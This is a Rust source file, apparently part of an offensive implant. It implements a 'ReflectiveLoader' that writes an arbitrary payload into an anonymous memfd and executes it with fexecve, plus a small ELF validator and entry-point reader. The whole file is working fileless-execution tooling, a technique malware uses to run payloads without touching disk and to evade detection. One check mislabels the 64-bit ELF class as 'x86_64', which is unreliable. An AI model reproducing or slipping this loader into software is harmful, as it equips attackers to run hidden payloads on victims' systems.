use anyhow::{anyhow, Result};
use libc::{c_char, c_int, close, fexecve, MFD_CLOEXEC};
use std::ffi::CString;
use std::os::unix::io::AsRawFd;

#[link(name = "c")]
extern "C" {
    fn memfd_create(name: *const c_char, flags: c_int) -> c_int;
}

pub struct ReflectiveLoader {
    fd: Option<c_int>,
}

impl ReflectiveLoader {
    pub fn new() -> Self {
        ReflectiveLoader { fd: None }
    }

    pub fn create_memfd(&mut self, name: &str) -> Result<c_int> {
        let cname = CString::new(name)
            .map_err(|e| anyhow!("Failed to create CString: {}", e))?;
        let fd = unsafe {
            memfd_create(cname.as_ptr(), MFD_CLOEXEC as c_int)
        };
        if fd < 0 {
            return Err(anyhow!("Failed to create memfd: {}", std::io::Error::last_os_error()));
        }
        self.fd = Some(fd);
        Ok(fd)
    }
    
    pub fn write_payload(&self, fd: c_int, payload: &[u8]) -> Result<()> {
        use std::os::unix::io::FromRawFd;
        use std::fs::File;
        let mut file = unsafe { File::from_raw_fd(fd) };
        std::io::Write::write_all(&mut file, payload)
            .map_err(|e| anyhow!("Failed to write payload: {}", e))?;
        std::mem::forget(file); // Prevent file from closing the fd on drop
        Ok(())
    }

    pub fn execute(&self, fd: c_int, args: &[&str], env: &[&str]) -> Result<()> {
        let c_args: Vec<CString> = args.iter()
            .map(|s| CString::new(*s))
            .collect::<Result<Vec<_>, _>>()
            .map_err(|e| anyhow!("Failed to convert args: {}", e))?;
        let mut c_args_ptrs: Vec<*const c_char> = c_args.iter()
            .map(|s| s.as_ptr())
            .collect();
        c_args_ptrs.push(std::ptr::null());
        let c_env: Vec<CString> = env.iter()
            .map(|s| CString::new(*s))
            .collect::<Result<Vec<_>, _>>()
            .map_err(|e| anyhow!("Failed to convert env: {}", e))?;
        let mut c_env_ptrs: Vec<*const c_char> = c_env.iter()
            .map(|s| s.as_ptr())
            .collect();
        c_env_ptrs.push(std::ptr::null());
        unsafe {
            if fexecve(fd, c_args_ptrs.as_ptr(), c_env_ptrs.as_ptr()) < 0 {
                return Err(anyhow!("fexecve failed: {}", std::io::Error::last_os_error()));
            }
        }
        Ok(())
    }

    pub fn execute_from_memory(&mut self, payload: &[u8], args: &[&str]) -> Result<()> {
        let fd = self.create_memfd("sophia_payload")?;
        self.write_payload(fd, payload)?;
        self.execute(fd, args, &[])?;
        Ok(())
    }
}

impl Drop for ReflectiveLoader {
    fn drop(&mut self) {
        if let Some(fd) = self.fd {
            unsafe {
                close(fd);
            }
        }
    }
}

pub struct ElfLoader {
    payload: Vec<u8>,
}

impl ElfLoader {
    pub fn new(payload: Vec<u8>) -> Self {
        ElfLoader { payload }
    }
    
    pub fn validate_elf(&self) -> Result<()> {
        if self.payload.len() < 64 {
            return Err(anyhow!("Payload too short to be ELF"));
        }
        if &self.payload[0..4] != b"\x7fELF" {
            return Err(anyhow!("Invalid ELF magic"));
        }
        if self.payload[4] != 2 {
            return Err(anyhow!("Not x86_64 ELF"));
        }
        Ok(())
    }
    
    pub fn get_entry_point(&self) -> Result<u64> {
        if self.payload.len() < 64 {
            return Err(anyhow!("Payload too short"));
        }
        let entry_point = u64::from_le_bytes([
            self.payload[24], self.payload[25], self.payload[26], self.payload[27],
            self.payload[28], self.payload[29], self.payload[30], self.payload[31],
        ]);
        Ok(entry_point)
    }
}
